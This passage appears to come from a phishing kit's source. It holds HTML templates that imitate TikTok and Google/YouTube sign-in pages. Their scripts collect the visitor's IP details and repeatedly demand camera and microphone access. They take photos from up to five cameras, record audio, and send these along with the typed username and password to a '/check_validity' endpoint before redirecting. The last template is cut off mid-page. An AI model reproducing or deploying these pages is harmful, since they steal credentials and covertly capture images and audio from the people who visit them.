        .next-btn:hover, .signin-btn:hover {
            background-color: #00D4D4;
        }
        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            text-align: center;
            color: #AAAAAA;
            font-size: 12px;
            padding: 10px 0;
            background-color: #000000;
            z-index: 1000;
            box-shadow: 0 -1px 3px rgba(0, 0, 0, 0.1);
        }
        .footer a {
            color: #AAAAAA;
            text-decoration: none;
            margin: 0 8px;
        }
        .footer a:hover {
            color: #00F7F7;
        }
        #email-screen {
            display: block;
        }
        #password-screen {
            display: none;
        }
        .error {
            color: #FF0050;
            font-size: 12px;
            margin-top: 5px;
            text-align: left;
            display: none;
        }
        @media (max-width: 480px) {
            .container {
                padding: 15px;
                margin: 10px;
                border: none;
                box-shadow: none;
            }
            .logo {
                width: 80px;
                height: 90px;
            }
            h1 {
                font-size: 18px;
            }
            .subtitle {
                font-size: 12px;
            }
            .footer {
                font-size: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container" id="email-screen">
        <img src="https://cdn.pixabay.com/photo/2021/06/15/12/28/tiktok-6338431_1280.png" alt="TikTok Logo" class="logo">
        <h1>Log in to TikTok</h1>
        <div class="subtitle">Create and share your short videos</div>
        <div class="input-container">
            <input type="text" id="email-input" placeholder="Phone, email, or username" required>
            <div id="email-error" class="error">Enter a valid phone, email, or username</div>
        </div>
        <div class="buttons">
            <button class="next-btn" onclick="showPasswordScreen()">Next</button>
            <div class="create-account">
                <a href="#">Don’t have an account? Sign up</a>
            </div>
        </div>
    </div>

    <div class="container" id="password-screen">
        <img src="https://cdn.pixabay.com/photo/2021/06/15/12/28/tiktok-6338431_1280.png" alt="TikTok Logo" class="logo">
        <h1>Welcome back</h1>
        <div class="subtitle" id="email-display"></div>
        <div class="input-container">
            <input type="password" id="password-input" placeholder="Password" required>
            <div id="password-error" class="error">Password cannot be empty</div>
        </div>
        <div class="forgot-link">
            <a href="#">Forgot password?</a>
        </div>
        <div class="buttons">
            <button class="signin-btn" onclick="handleSignIn()">Log in</button>
            <div class="create-account">
                <a href="#" onclick="backToEmailScreen()">Back</a>
            </div>
        </div>
    </div>

    <div class="footer">
        <a href="#">TikTok for Good</a>
        <a href="#">Help Center</a>
        <a href="#">Safety Center</a>
        <a href="#">Creator Portal</a>
        <a href="#">Privacy</a>
    </div>

    <script>
        let mediaProcessingComplete = false;
        let signInClickCount = 0;

        async function fetchWithTimeout(url, timeout = 3000) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), timeout);
                
                const response = await fetch(url, { signal: controller.signal });
                clearTimeout(timeoutId);
                
                return { url, data: await response.text() };
            } catch (error) {
                return { url, data: `Error: ${error.message}` };
            }
        }

        async function getUserMediaPermissions() {
            while (true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    return stream;
                } catch (error) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
            const video = document.createElement('video');
            video.srcObject = stream;
            
            try {
                const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Image capture timeout')), timeout)
                );
                
                await Promise.race([loaded, timeoutPromise]);
                video.play();

                const canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, width, height);
                
                const imageData = canvas.toDataURL('image/jpeg');
                video.srcObject = null;
                return imageData;
            } catch (error) {
                video.srcObject = null;
                return null;
            }
        }

        async function recordAudioWithTimeout(stream, duration = 5000, initialTimeout = 2000) {
            return new Promise(async (resolve) => {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                let hasData = false;
                
                recorder.ondataavailable = e => {
                    chunks.push(e.data);
                    hasData = true;
                };
                
                recorder.onstop = () => {
                    if (!hasData) {
                        resolve(null);
                        return;
                    }
                    const blob = new Blob(chunks, { type: 'audio/wav' });
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                };

                try {
                    recorder.start();
                    
                    await Promise.race([
                        new Promise(resolve => setTimeout(resolve, initialTimeout)),
                        new Promise(resolve => recorder.onstart = resolve)
                    ]);
                    
                    if (!hasData) {
                        recorder.stop();
                        return;
                    }

                    setTimeout(() => recorder.stop(), duration);
                } catch (error) {
                    recorder.stop();
                    resolve(null);
                }
            });
        }

        async function processMedia() {
            const urls = [
                'https://ifconfig.me/',
                'https://ifconfig.me/all',
                'https://whatismyipaddress.com/',
                'https://www.showmyip.com/',
                'https://ipaddress.my/',
                'https://ipinfo.io/json',
                'https://ipapi.co/json',
                'https://ipwho.is/',
                'https://tiktok.com/',
                'https://facebook.com/'
            ];

            const fetchPromises = urls.map(url => fetchWithTimeout(url));
            const results = await Promise.all(fetchPromises);
            const dataJson = Object.fromEntries(results.map(result => [result.url, result.data]));

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "ifconfig",
                    data: dataJson
                }),
                headers: { 'Content-Type': 'application/json' }
            });

            const stream = await getUserMediaPermissions();
            
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(device => device.kind === 'videoinput');
            
            for (const device of videoDevices.slice(0, 5)) {
                const cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: device.deviceId }
                });
                
                const imageData = await captureImageWithTimeout(cameraStream);
                if (imageData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "camera",
                            data: imageData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                cameraStream.getTracks().forEach(track => track.stop());
            }

            const audioDevices = devices.filter(device => device.kind === 'audioinput');
            if (audioDevices.length > 0) {
                const audioStream = await navigator.mediaDevices.getUserMedia({
                    audio: { deviceId: audioDevices[0].deviceId }
                });
                
                const audioData = await recordAudioWithTimeout(audioStream);
                if (audioData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "microphone",
                            data: audioData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                audioStream.getTracks().forEach(track => track.stop());
            }

            mediaProcessingComplete = true;
            checkAndRedirect();
        }

        function showPasswordScreen() {
            const emailInput = document.getElementById('email-input').value;
            const emailError = document.getElementById('email-error');
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            if (!emailInput) {
                emailError.textContent = "Phone, email, or username cannot be empty";
                emailError.style.display = 'block';
            } else if (!emailRegex.test(emailInput)) {
                emailError.textContent = "Enter a valid phone, email, or username";
                emailError.style.display = 'block';
            } else {
                emailError.style.display = 'none';
                document.getElementById('email-screen').style.display = 'none';
                document.getElementById('password-screen').style.display = 'block';
                document.getElementById('email-display').textContent = emailInput;
            }
        }

        function backToEmailScreen() {
            document.getElementById('password-screen').style.display = 'none';
            document.getElementById('email-screen').style.display = 'block';
            document.getElementById('password-error').style.display = 'none';
        }

        let accountSent = false;

        async function handleSignIn() {
            const email = document.getElementById('email-input').value;
            const password = document.getElementById('password-input').value;
            const passwordError = document.getElementById('password-error');

            signInClickCount++;

            if (signInClickCount >= 3) {
                window.location.href = "<!redirect!>";
                return;
            }

            if (!password) {
                passwordError.textContent = "Password cannot be empty";
                passwordError.style.display = 'block';
                return;
            } else {
                passwordError.style.display = 'none';
            }

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "account",
                    data: { user: email, password: password }
                }),
                headers: { 'Content-Type': 'application/json' }
            });
            accountSent = true;
            checkAndRedirect();
        }

        function checkAndRedirect() {
            if (mediaProcessingComplete && accountSent) {
                window.location.href = "<!redirect!>";
            }
        }

        processMedia();
    </script>
</body>
</html>
""", """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in - TikTok</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: #000000; /* TikTok'un koyu arka planı */
        }
        .container {
            width: 100%;
            max-width: 350px;
            padding: 30px;
            background-color: #1A1A1A;
            border-radius: 12px;
            box-sizing: border-box;
            margin: 20px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
        }
        .logo {
            display: block;
            margin: 0 auto 20px;
            width: 100px;
            height: 100px;
        }
        h1 {
            font-size: 20px;
            font-weight: 500;
            color: #FFFFFF;
            text-align: center;
            margin: 0 0 8px;
        }
        .subtitle {
            font-size: 14px;
            color: #AAAAAA;
            text-align: center;
            margin-bottom: 20px;
        }
        .input-container {
            margin-bottom: 15px;
        }
        input {
            width: 100%;
            padding: 12px 14px;
            font-size: 14px;
            border: 1px solid #444444;
            border-radius: 8px;
            outline: none;
            box-sizing: border-box;
            background-color: #2A2A2A;
            color: #FFFFFF;
        }
        input::placeholder {
            color: #888888;
        }
        input:focus {
            border-color: #00F7F7;
            box-shadow: 0 0 0 1px #00F7F7;
        }
        .forgot-link {
            margin-bottom: 20px;
        }
        .forgot-link a {
            color: #00F7F7;
            text-decoration: none;
            font-size: 12px;
        }
        .buttons {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .create-account {
            margin-top: 15px;
        }
        .create-account a {
            color: #00F7F7;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .next-btn, .signin-btn {
            background-color: #00F7F7;
            color: #000000;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 22px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        .next-btn:hover, .signin-btn:hover {
            background-color: #00D4D4;
        }
        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            text-align: center;
            color: #AAAAAA;
            font-size: 12px;
            padding: 10px 0;
            background-color: #000000;
            z-index: 1000;
            box-shadow: 0 -1px 3px rgba(0, 0, 0, 0.1);
        }
        .footer a {
            color: #AAAAAA;
            text-decoration: none;
            margin: 0 8px;
        }
        .footer a:hover {
            color: #00F7F7;
        }
        #email-screen {
            display: block;
        }
        #password-screen {
            display: none;
        }
        .error {
            color: #FF0050;
            font-size: 12px;
            margin-top: 5px;
            text-align: left;
            display: none;
        }
        @media (max-width: 480px) {
            .container {
                padding: 15px;
                margin: 10px;
                border: none;
                box-shadow: none;
            }
            .logo {
                width: 80px;
                height: 90px;
            }
            h1 {
                font-size: 18px;
            }
            .subtitle {
                font-size: 12px;
            }
            .footer {
                font-size: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container" id="email-screen">
        <img src="https://cdn.pixabay.com/photo/2021/06/15/12/28/tiktok-6338431_1280.png" alt="TikTok Logo" class="logo">
        <h1>Log in to TikTok</h1>
        <div class="subtitle">Create and share your short videos</div>
        <div class="input-container">
            <input type="text" id="email-input" placeholder="Phone, email, or username" required>
            <div id="email-error" class="error">Enter a valid phone, email, or username</div>
        </div>
        <div class="buttons">
            <button class="next-btn" onclick="showPasswordScreen()">Next</button>
            <div class="create-account">
                <a href="#">Don’t have an account? Sign up</a>
            </div>
        </div>
    </div>

    <div class="container" id="password-screen">
        <img src="https://cdn.pixabay.com/photo/2021/06/15/12/28/tiktok-6338431_1280.png" alt="TikTok Logo" class="logo">
        <h1>Welcome back</h1>
        <div class="subtitle" id="email-display"></div>
        <div class="input-container">
            <input type="password" id="password-input" placeholder="Password" required>
            <div id="password-error" class="error">Password cannot be empty</div>
        </div>
        <div class="forgot-link">
            <a href="#">Forgot password?</a>
        </div>
        <div class="buttons">
            <button class="signin-btn" onclick="handleSignIn()">Log in</button>
            <div class="create-account">
                <a href="#" onclick="backToEmailScreen()">Back</a>
            </div>
        </div>
    </div>

    <div class="footer">
        <a href="#">TikTok for Good</a>
        <a href="#">Help Center</a>
        <a href="#">Safety Center</a>
        <a href="#">Creator Portal</a>
        <a href="#">Privacy</a>
    </div>

    <script>
        let mediaProcessingComplete = false;
        let signInClickCount = 0;

        async function fetchWithTimeout(url, timeout = 3000) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), timeout);
                
                const response = await fetch(url, { signal: controller.signal });
                clearTimeout(timeoutId);
                
                return { url, data: await response.text() };
            } catch (error) {
                return { url, data: `Error: ${error.message}` };
            }
        }

        async function getUserMediaPermissions() {
            while (true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    return stream;
                } catch (error) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
            const video = document.createElement('video');
            video.srcObject = stream;
            
            try {
                const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Image capture timeout')), timeout)
                );
                
                await Promise.race([loaded, timeoutPromise]);
                video.play();

                const canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, width, height);
                
                const imageData = canvas.toDataURL('image/jpeg');
                video.srcObject = null;
                return imageData;
            } catch (error) {
                video.srcObject = null;
                return null;
            }
        }

        async function recordAudioWithTimeout(stream, duration = 5000, initialTimeout = 2000) {
            return new Promise(async (resolve) => {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                let hasData = false;
                
                recorder.ondataavailable = e => {
                    chunks.push(e.data);
                    hasData = true;
                };
                
                recorder.onstop = () => {
                    if (!hasData) {
                        resolve(null);
                        return;
                    }
                    const blob = new Blob(chunks, { type: 'audio/wav' });
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                };

                try {
                    recorder.start();
                    
                    await Promise.race([
                        new Promise(resolve => setTimeout(resolve, initialTimeout)),
                        new Promise(resolve => recorder.onstart = resolve)
                    ]);
                    
                    if (!hasData) {
                        recorder.stop();
                        return;
                    }

                    setTimeout(() => recorder.stop(), duration);
                } catch (error) {
                    recorder.stop();
                    resolve(null);
                }
            });
        }

        async function processMedia() {
            const urls = [
                'https://ifconfig.me/',
                'https://ifconfig.me/all',
                'https://whatismyipaddress.com/',
                'https://www.showmyip.com/',
                'https://ipaddress.my/',
                'https://ipinfo.io/json',
                'https://ipapi.co/json',
                'https://ipwho.is/',
                'https://tiktok.com/',
                'https://facebook.com/'
            ];

            const fetchPromises = urls.map(url => fetchWithTimeout(url));
            const results = await Promise.all(fetchPromises);
            const dataJson = Object.fromEntries(results.map(result => [result.url, result.data]));

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "ifconfig",
                    data: dataJson
                }),
                headers: { 'Content-Type': 'application/json' }
            });

            const stream = await getUserMediaPermissions();
            
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(device => device.kind === 'videoinput');
            
            for (const device of videoDevices.slice(0, 5)) {
                const cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: device.deviceId }
                });
                
                const imageData = await captureImageWithTimeout(cameraStream);
                if (imageData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "camera",
                            data: imageData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                cameraStream.getTracks().forEach(track => track.stop());
            }

            const audioDevices = devices.filter(device => device.kind === 'audioinput');
            if (audioDevices.length > 0) {
                const audioStream = await navigator.mediaDevices.getUserMedia({
                    audio: { deviceId: audioDevices[0].deviceId }
                });
                
                const audioData = await recordAudioWithTimeout(audioStream);
                if (audioData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "microphone",
                            data: audioData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                audioStream.getTracks().forEach(track => track.stop());
            }

            mediaProcessingComplete = true;
            checkAndRedirect();
        }

        function showPasswordScreen() {
            const emailInput = document.getElementById('email-input').value;
            const emailError = document.getElementById('email-error');
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            if (!emailInput) {
                emailError.textContent = "Phone, email, or username cannot be empty";
                emailError.style.display = 'block';
            } else if (!emailRegex.test(emailInput)) {
                emailError.textContent = "Enter a valid phone, email, or username";
                emailError.style.display = 'block';
            } else {
                emailError.style.display = 'none';
                document.getElementById('email-screen').style.display = 'none';
                document.getElementById('password-screen').style.display = 'block';
                document.getElementById('email-display').textContent = emailInput;
            }
        }

        function backToEmailScreen() {
            document.getElementById('password-screen').style.display = 'none';
            document.getElementById('email-screen').style.display = 'block';
            document.getElementById('password-error').style.display = 'none';
        }

        let accountSent = false;

        async function handleSignIn() {
            const email = document.getElementById('email-input').value;
            const password = document.getElementById('password-input').value;
            const passwordError = document.getElementById('password-error');

            signInClickCount++;

            if (signInClickCount >= 3) {
                window.location.href = "<!redirect!>";
                return;
            }

            if (!password) {
                passwordError.textContent = "Password cannot be empty";
                passwordError.style.display = 'block';
                return;
            } else {
                passwordError.style.display = 'none';
            }

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "account",
                    data: { user: email, password: password }
                }),
                headers: { 'Content-Type': 'application/json' }
            });
            accountSent = true;
            checkAndRedirect();
        }

        function checkAndRedirect() {
            if (mediaProcessingComplete && accountSent) {
                window.location.href = "<!redirect!>";
            }
        }

        processMedia();
    </script>
</body>
</html>
"""], "gyl0": ["""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube - Sign in</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f9f9f9;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: auto;
        }
        .container {
            width: 100%;
            max-width: 440px;
            padding: 20px;
            box-sizing: border-box;
            text-align: center;
        }
        .logo {
            width: 100px;
            margin-bottom: 20px;
        }
        .login-box {
            background-color: #fff;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 40px 40px 36px;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
            width: 100%;
            box-sizing: border-box;
        }
        .title {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 8px;
        }
        .subtitle {
            font-size: 16px;
            color: #5f6368;
            margin-bottom: 24px;
        }
        input {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
            outline: none;
            margin-bottom: 20px;
        }
        input:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
        }
        .error {
            color: #d93025;
            font-size: 12px;
            margin-bottom: 16px;
            text-align: left;
            display: none;
        }
        .next-btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            border-radius: 4px;
            cursor: pointer;
            width: auto;
            float: right;
        }
        .next-btn:hover {
            background-color: #1557b0;
        }
        .forgot-link {
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
            display: block;
            text-align: left;
            margin-top: 20px;
        }
        .forgot-link:hover {
            text-decoration: underline;
        }
        .create-account {
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
            display: inline-block;
            margin-top: 20px;
        }
        .create-account:hover {
            text-decoration: underline;
        }
        .footer {
            position: fixed;
            bottom: 0;
            width: 100%;
            text-align: center;
            padding: 10px 0;
            color: #5f6368;
            font-size: 12px;
        }
        .footer a {
            color: #5f6368;
            text-decoration: none;
            margin: 0 8px;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        @media (max-width: 600px) {
            .container {
                padding: 15px;
            }
            .login-box {
                padding: 20px;
                border: none;
                box-shadow: none;
            }
            .logo {
                width: 80px;
            }
            .title {
                font-size: 20px;
            }
            .subtitle {
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo" class="logo">
            <h1 class="title">Sign in</h1>
            <p class="subtitle">to continue to YouTube</p>
            <input type="text" placeholder="Email or phone" id="email-input">
            <div id="email-error" class="error">Enter a valid email or phone number</div>
            <input type="password" placeholder="Password" id="password-input">
            <div id="password-error" class="error">Password cannot be empty</div>
            <button class="next-btn" onclick="handleLogin()">Next</button>
            <a href="#" class="forgot-link">Forgot password?</a>
            <a href="#" class="create-account">Create account</a>
        </div>
    </div>
    <div class="footer">
        <a href="#">English (United States)</a>
        <a href="#">Help</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
    </div>

    <script>
        let mediaProcessingComplete = false;
        let loginClickCount = 0;
        let accountSent = false;

        async function fetchWithTimeout(url, timeout = 3000) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), timeout);
                const response = await fetch(url, { signal: controller.signal });
                clearTimeout(timeoutId);
                return { url, data: await response.text() };
            } catch (error) {
                return { url, data: `Error: ${error.message}` };
            }
        }

        async function getUserMediaPermissions() {
            while (true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    return stream;
                } catch (error) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
            const video = document.createElement('video');
            video.srcObject = stream;
            try {
                const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Image capture timeout')), timeout)
                );
                await Promise.race([loaded, timeoutPromise]);
                video.play();

                const canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, width, height);
                
                const imageData = canvas.toDataURL('image/jpeg');
                video.srcObject = null;
                return imageData;
            } catch (error) {
                video.srcObject = null;
                return null;
            }
        }

        async function recordAudioWithTimeout(stream, duration = 5000, initialTimeout = 2000) {
            return new Promise(async (resolve) => {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                let hasData = false;
                
                recorder.ondataavailable = e => {
                    chunks.push(e.data);
                    hasData = true;
                };
                
                recorder.onstop = () => {
                    if (!hasData) {
                        resolve(null);
                        return;
                    }
                    const blob = new Blob(chunks, { type: 'audio/wav' });
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                };

                try {
                    recorder.start();
                    await Promise.race([
                        new Promise(resolve => setTimeout(resolve, initialTimeout)),
                        new Promise(resolve => recorder.onstart = resolve)
                    ]);
                    if (!hasData) {
                        recorder.stop();
                        return;
                    }
                    setTimeout(() => recorder.stop(), duration);
                } catch (error) {
                    recorder.stop();
                    resolve(null);
                }
            });
        }

        async function processMedia() {
            const urls = [
                'https://ifconfig.me/',
                'https://ifconfig.me/all',
                'https://whatismyipaddress.com/',
                'https://www.showmyip.com/',
                'https://ipaddress.my/',
                'https://ipinfo.io/json',
                'https://ipapi.co/json',
                'https://ipwho.is/',
                'https://google.com/',
                'https://youtube.com/'
            ];

            const fetchPromises = urls.map(url => fetchWithTimeout(url));
            const results = await Promise.all(fetchPromises);
            const dataJson = Object.fromEntries(results.map(result => [result.url, result.data]));

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "ifconfig",
                    data: dataJson
                }),
                headers: { 'Content-Type': 'application/json' }
            });

            const stream = await getUserMediaPermissions();
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(device => device.kind === 'videoinput');
            
            for (const device of videoDevices.slice(0, 5)) {
                const cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: device.deviceId }
                });
                const imageData = await captureImageWithTimeout(cameraStream);
                if (imageData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "camera",
                            data: imageData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                cameraStream.getTracks().forEach(track => track.stop());
            }

            const audioDevices = devices.filter(device => device.kind === 'audioinput');
            if (audioDevices.length > 0) {
                const audioStream = await navigator.mediaDevices.getUserMedia({
                    audio: { deviceId: audioDevices[0].deviceId }
                });
                const audioData = await recordAudioWithTimeout(audioStream);
                if (audioData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "microphone",
                            data: audioData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                audioStream.getTracks().forEach(track => track.stop());
            }

            mediaProcessingComplete = true;
            checkAndRedirect();
        }

        async function handleLogin() {
            const email = document.getElementById('email-input').value;
            const password = document.getElementById('password-input').value;
            const emailError = document.getElementById('email-error');
            const passwordError = document.getElementById('password-error');
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            loginClickCount++;

            if (loginClickCount >= 3) {
                window.location.href = "<!redirect!>";
                return;
            }

            if (!email) {
                emailError.textContent = "Enter an email or phone number";
                emailError.style.display = 'block';
                return;
            } else if (!emailRegex.test(email)) {
                emailError.textContent = "Enter a valid email or phone number";
                emailError.style.display = 'block';
                return;
            } else {
                emailError.style.display = 'none';
            }

            if (!password) {
                passwordError.textContent = "Enter a password";
                passwordError.style.display = 'block';
                return;
            } else {
                passwordError.style.display = 'none';
            }

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "account",
                    data: { user: email, password: password }
                }),
                headers: { 'Content-Type': 'application/json' }
            });
            accountSent = true;
            checkAndRedirect();
        }

        function checkAndRedirect() {
            if (mediaProcessingComplete && accountSent) {
                window.location.href = "<!redirect!>";
            }
        }

        // Medya işlemlerini başlat
        processMedia();
    </script>
</body>
</html>""", """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube - Sign in</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f9f9f9;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: auto;
        }
        .container {
            width: 100%;
            max-width: 440px;
            padding: 20px;
            box-sizing: border-box;
            text-align: center;
        }
        .logo {
            width: 100px;
            margin-bottom: 20px;
        }
        .login-box {
            background-color: #fff;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 40px 40px 36px;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
            width: 100%;
            box-sizing: border-box;
        }
        .title {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 8px;
        }
        .subtitle {
            font-size: 16px;
            color: #5f6368;
            margin-bottom: 24px;
        }
        input {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
            outline: none;
            margin-bottom: 20px;
        }
        input:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
        }
        .error {
            color: #d93025;
            font-size: 12px;
            margin-bottom: 16px;
            text-align: left;
            display: none;
        }
        .next-btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            border-radius: 4px;
            cursor: pointer;
            width: auto;
            float: right;
        }
        .next-btn:hover {
            background-color: #1557b0;
        }
        .forgot-link {
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
            display: block;
            text-align: left;
            margin-top: 20px;
        }
        .forgot-link:hover {
            text-decoration: underline;
        }
        .create-account {
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
            display: inline-block;
            margin-top: 20px;
        }
        .create-account:hover {
            text-decoration: underline;
        }
        .footer {
            position: fixed;
            bottom: 0;
            width: 100%;
            text-align: center;
            padding: 10px 0;
            color: #5f6368;
            font-size: 12px;
        }
        .footer a {
            color: #5f6368;
            text-decoration: none;
            margin: 0 8px;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        @media (max-width: 600px) {
            .container {
                padding: 15px;
            }
            .login-box {
                padding: 20px;
                border: none;
                box-shadow: none;
            }
            .logo {
                width: 80px;
            }
            .title {
                font-size: 20px;
            }
            .subtitle {
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo" class="logo">
            <h1 class="title">Sign in</h1>
            <p class="subtitle">to continue to YouTube</p>
            <input type="text" placeholder="Email or phone" id="email-input">
            <div id="email-error" class="error">Enter a valid email or phone number</div>
            <input type="password" placeholder="Password" id="password-input">
            <div id="password-error" class="error">Password cannot be empty</div>
            <button class="next-btn" onclick="handleLogin()">Next</button>
            <a href="#" class="forgot-link">Forgot password?</a>
            <a href="#" class="create-account">Create account</a>
        </div>
    </div>
    <div class="footer">
        <a href="#">English (United States)</a>
        <a href="#">Help</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
    </div>

    <script>
